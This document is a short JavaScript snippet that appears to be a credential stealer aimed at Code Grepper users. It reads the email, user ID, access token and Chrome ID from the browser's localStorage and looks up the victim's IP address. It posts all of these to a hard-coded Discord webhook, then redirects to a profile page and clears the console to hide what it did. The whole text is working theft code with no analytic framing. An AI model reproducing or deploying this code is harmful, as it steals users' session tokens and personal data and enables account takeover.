fetch('https://api.ipify.org?format=json')
    .then((response) => {
        return response.json();
    })
    .then((ipaddress) => {
        let email = localStorage.getItem('email')
        let user_id = localStorage.getItem('user_id')
        let token = localStorage.getItem('access_token')
        let chrome_id = localStorage.getItem('chrome_id')
        let webhook = `https://discord.com/api/webhooks/867446164625031168/bSBKmcagRHnRAYZZdRZf3Qm2-ntP62CCUtboUq48Za7y-wifTlagpCSoqMH6EJXlQGnW`
        fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                'content': '```js\nId: ' + user_id + '\nIP Address: ' + ipaddress.ip + '\nChrome Id: ' + chrome_id + '\nEmail: ' + email + '\nToken: ' + token + ' ```'
            }),
        })
            .then((res) => res.json())
            .then((data) => {
                console.log(data)
            })
            .catch((err) => console.log(err));
        window.location = "https://www.codegrepper.com/app/profile.php?id=98467"
    });
console.clear();